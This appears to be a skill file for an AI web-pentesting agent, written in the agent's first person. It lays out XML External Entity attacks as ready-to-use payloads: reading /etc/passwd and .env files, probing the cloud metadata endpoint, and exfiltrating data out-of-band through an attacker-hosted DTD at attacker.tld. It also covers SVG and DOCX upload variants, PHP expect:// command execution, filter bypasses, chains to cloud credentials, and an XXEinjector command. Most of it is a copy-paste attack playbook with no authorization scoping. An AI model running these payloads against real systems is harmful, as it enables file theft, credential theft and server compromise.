# SKILL: XML External Entity (XXE — Classic / Blind / OOB / SSRF / RCE via XXE)

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (xml external entity (xxe — classic / blind / oob / ssrf / rce via xxe)) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
Wherever the app parses XML (SOAP, OAuth/SAML metadata, SVG upload, DOCX/XLSX upload, RSS, XML APIs, OOXML, EPUB), I test for XXE — file read, SSRF, RCE in old PHP+expect.

---

## DETECTION
Submit XML with custom DOCTYPE; observe error / response containing fetched content.

## EXPLOITATION
### Classic file read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### SSRF via XXE
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>
```

### Blind / OOB exfil (server doesn't reflect)
```xml
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.tld/x.dtd"> %dtd;]>
<foo>&send;</foo>
```
attacker-hosted x.dtd:
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.tld/?d=%file;'>">
%all;
```

### XInclude (when DOCTYPE blocked but server permits XInclude)
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

### SVG upload XXE
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

### DOCX / XLSX (zip with XML inside)
```bash
unzip doc.docx -d doc/
# edit doc/word/document.xml — add DOCTYPE
zip -r evil.docx doc/
# upload to a Word/Excel-rendering target
```

### PHP `expect://` RCE via XXE (legacy PHP with expect ext)
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<foo>&xxe;</foo>
```

### XXE + PHP filter base64 to read binary files
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/.env">
```

## PAYLOADS (real, copy-paste, grouped)
(See above — comprehensive)

## BYPASS TECHNIQUES
- DOCTYPE blocked → XInclude (xmlns:xi).
- DTD external blocked but parameter entities allowed → use only parameter entities `<!ENTITY %`.
- HTTP egress blocked → use FTP via `ftp://attacker.tld/?d=%file;` (some libs).
- Encoding: utf-16 → `<?xml version="1.0" encoding="UTF-16"?>` re-encode payload.

## CHAIN POTENTIAL
XXE → IMDS → cloud creds; XXE → /etc/passwd + /proc/self/environ → DB creds; XXE in OAuth/SAML → assertion forgery / RCE.

## TOOLS
XXEinjector (Ruby), Burp ActiveScan++, manual

## COMMANDS
```bash
# Burp: Repeater + ActiveScan++ + Collaborator
# XXEinjector
ruby XXEinjector.rb --host=attacker.tld --httpport=8888 --file=request.txt --path=/etc/passwd
```

## EDGE CASES / NOT-A-BUG TRAPS
libxml2 default in PHP/Java/Node has been hardened — many SVG renderers (ImageMagick, librsvg) still process old XML. Test office docs explicitly.

## TRIAGE ANGLE (per platform)
Show file read of `/etc/passwd` or `/etc/shadow` (if root); IMDS pivot raises severity.

## SEVERITY & CVSS
8.5–9.5 typical.

## REFERENCES
PortSwigger XXE • PayloadsAllTheThings/XXE Injection • OWASP XXE Prevention
